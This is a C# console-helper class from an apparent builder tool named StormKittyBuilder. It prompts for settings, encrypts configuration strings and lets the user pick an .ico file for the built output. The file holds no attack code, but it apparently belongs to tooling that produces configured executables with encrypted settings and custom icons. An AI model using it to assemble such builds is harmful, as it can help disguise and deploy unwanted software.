/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.Windows.Forms;

namespace StormKittyBuilder
{
    internal sealed class cli
    {
        public static string GetBoolValue(string text)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("(?) " + text + " (y/n): ");
            Console.ForegroundColor = ConsoleColor.White;
            string result = Console.ReadLine();
            return result.ToUpper() == "Y" ? "1" : "0";
        }

        public static string GetStringValue(string text)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("(?) " + text + "\n>>> ");
            Console.ForegroundColor = ConsoleColor.White;
            return Console.ReadLine();
        }

        public static string GetEncryptedString(string text)
        {
            string result = GetStringValue(text);
            if (!string.IsNullOrEmpty(result))
                return crypt.EncryptConfig(result);

            return "";
        }

        public static void ShowError(string text)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("(!) " + text + "\n    Press any key to exit...");
            Console.ReadLine();
            Environment.Exit(1);
        }

        public static void ShowInfo(string text)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("(i) " + text);
        }

        public static void ShowSuccess(string text)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("(+) " + text);
        }

        public static string GetIconPath()
        {
            OpenFileDialog OpenFileDialog = new OpenFileDialog();

            OpenFileDialog.InitialDirectory = ".\\icons";
            OpenFileDialog.Filter = "ico files (*.ico)|*.ico|All files (*.*)|*.*";
            OpenFileDialog.FilterIndex = 1;
            OpenFileDialog.RestoreDirectory = true;

            if (OpenFileDialog.ShowDialog() == DialogResult.OK)
                return OpenFileDialog.FileName;
            

            return null;
        }

    }
}
